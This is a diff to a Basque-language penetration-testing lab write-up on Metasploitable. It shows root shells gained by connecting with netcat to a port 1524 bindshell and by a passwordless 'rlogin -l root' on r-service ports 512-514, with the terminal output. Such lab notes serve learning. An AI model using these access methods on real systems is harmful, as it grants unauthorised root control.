@@ -190,7 +190,7 @@ Service detection performed. Please report any incorrect results at https://nmap
                                        
 ```
 
-# 1. Ahultasuna
+# Ahultasunak
 
 1524 portuan root shell-a dela esaten du(1524/tcp  open  bindshell   Metasploitable root shell), ondorioz, netcat egingo diogu portuari
 
@@ -200,3 +200,30 @@ Service detection performed. Please report any incorrect results at https://nmap
 root@metasploitable:/# whoami
 root
 ```
+
+Beste portu bertsio guztiak begiratu interneten 
+
+- 512, 513, 514 portuak zerbitzu zaharrak dituzte eta batzutan ez dute pazahitza eskatzen.
+```
+                                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ rlogin -l root 10.0.2.4
+Last login: Tue Apr  7 14:40:44 EDT 2026 from 10.0.2.15 on pts/1
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+You have mail.
+root@metasploitable:~# whoami
+root
+root@metasploitable:~# 
+```
+
+
